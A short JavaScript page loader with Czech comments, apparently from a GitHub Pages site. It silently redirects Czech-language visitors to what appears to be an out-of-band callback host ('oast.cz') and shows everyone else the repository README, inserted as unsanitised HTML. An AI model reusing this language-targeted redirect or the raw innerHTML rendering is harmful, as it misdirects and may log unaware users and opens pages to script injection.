// Zjistíme jazykové nastavení uživatele
const userLang = navigator.language || navigator.userLanguage;

if (userLang && (userLang === "cs" || userLang.startsWith("cs-"))) {
  // Pokud je jazyk český, přesměrujeme uživatele
  window.location.href = "https://yojpmr6f.oast.cz"; // Změňte URL podle potřeby
} else {
  // Pokud nedojde k redirectu, načteme README.md z GitHub
  const readmeUrl = "https://raw.githubusercontent.com/opicevopice/opicevopice.github.io/refs/heads/main/README.md"; // Nahraďte vlastní URL

  fetch(readmeUrl)
    .then(response => response.text())
    .then(markdown => {
      // Pokud máte k dispozici knihovnu marked, převést Markdown na HTML
      if (window.marked) {
        const htmlContent = marked.parse(markdown);
        document.body.innerHTML = htmlContent;
      } else {
        // Jinak zobrazíme obsah jako předformátovaný text
        const pre = document.createElement("pre");
        pre.textContent = markdown;
        document.body.appendChild(pre);
      }
    })
    .catch(error => console.error("Chyba při načítání README:", error));
}
